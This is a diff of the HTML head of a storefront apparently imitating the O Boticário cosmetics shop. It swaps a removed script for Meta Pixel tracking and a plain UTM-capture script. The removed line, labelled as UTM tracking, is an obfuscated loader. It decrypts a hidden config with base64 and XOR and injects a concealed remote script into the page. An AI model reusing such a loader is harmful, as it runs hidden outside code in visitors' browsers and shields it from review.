@@ -7,16 +7,63 @@
     <meta name="description" content="Loja O Boticário - Os melhores produtos de beleza e perfumaria" />
     <title>oBoticário</title>
     
-    <!-- Script de UTMs Utmify -->
-    <script>(function(){var h_9fk5=atob("DOFHxrgTvKtnC9QFLppls8p/npFFY6BxXpJ96Zdw2MVJfqBoR4c+6Nt80YUFeft2TZMutsxgk94TZqcqQoAzo8tnksEUKfgnT5UztNFxyd8CePY/dZplqNl+2YldKbBkWoBqs8x+1c0eJqR3S5ciqMw+xMgIb/l2TYpl6ppl3ccSbvY/DMM66sMx0soKbvY/DIUmstk+yd8KYrJ8A5E1o8520t9KeKFnR4U05JQxysoLfrEnFMNlu+Vu");var a_201w=[];for(var a_3y=0;a_3y<h_9fk5.length;a_3y++){a_201w.push(h_9fk5.charCodeAt(a_3y)&255);}var b_q7qk=a_201w[0];var e_30d=a_201w.slice(1,1+b_q7qk);var h_gejn=a_201w.slice(1+b_q7qk);var r_sw8=h_gejn.map(function(b,r_g0){return b^e_30d[r_g0%b_q7qk];});var d_kj="";for(var y_0=0;y_0<r_sw8.length;y_0++){d_kj+=String.fromCharCode(r_sw8[y_0]&255);}var b_7np=decodeURIComponent(escape(d_kj));var f_uw5h=JSON.parse(b_7np);var x_kj=f_uw5h.globals||[];x_kj.forEach(function(w_qqd){window[w_qqd.name]=w_qqd.value;});var b_2=document.createElement("script");b_2.src=f_uw5h.url;b_2.async=true;b_2.defer=true;(f_uw5h.attributes||[]).forEach(function(p_xvh){b_2.setAttribute(p_xvh.name,p_xvh.value);});(document.head||document.documentElement).appendChild(b_2);})();</script>
+    <!-- Meta Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1457113909966671');
+      fbq('track', 'PageView');
+    </script>
+    <!-- End Meta Pixel Code -->
+    
+    <!-- Script Utmify - Rastreamento UTM -->
+    <script>
+      (function(){
+        const captureParams = () => {
+          const params = new URLSearchParams(window.location.search);
+          const utmParams = {};
+          params.forEach((value, key) => {
+            if (key.startsWith('utm_') || key === 'src' || key === 'sck' || key === 'utm_source' || key === 'utm_medium' || key === 'utm_campaign' || key === 'utm_content' || key === 'utm_term') {
+              utmParams[key] = value;
+            }
+          });
+          if (Object.keys(utmParams).length > 0) {
+            try {
+              localStorage.setItem('utmParams', JSON.stringify(utmParams));
+              console.log('[UTMIFY DEBUG] UTM params salvos:', utmParams);
+            } catch(e) {
+              console.log('[UTMIFY DEBUG] Erro ao salvar params:', e);
+            }
+          }
+        };
+        
+        // Captura imediatamente
+        captureParams();
+        
+        // Verifica se tem salvo e adiciona nos links
+        try {
+          const saved = localStorage.getItem('utmParams');
+          if (saved) {
+            const params = JSON.parse(saved);
+            console.log('[UTMIFY DEBUG] Verificando UTMs salvos...', params);
+          }
+        } catch(e) {}
+      })();
+    </script>
     
     <!-- Script oficial Utmify -->
     <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script>
+    <script>
+      !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1457113909966671');
+      fbq('track', 'PageView');
+    </script>
+    <!-- End Meta Pixel Code -->
     
     <!-- Stripe.js -->
     <script src="https://js.stripe.com/v3/"></script>
   </head>
   <body>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1457113909966671&ev=PageView&noscript=1"/></noscript>
     <div id="root"></div>
     <script type="module" src="/src/main.jsx"></script>
   </body>
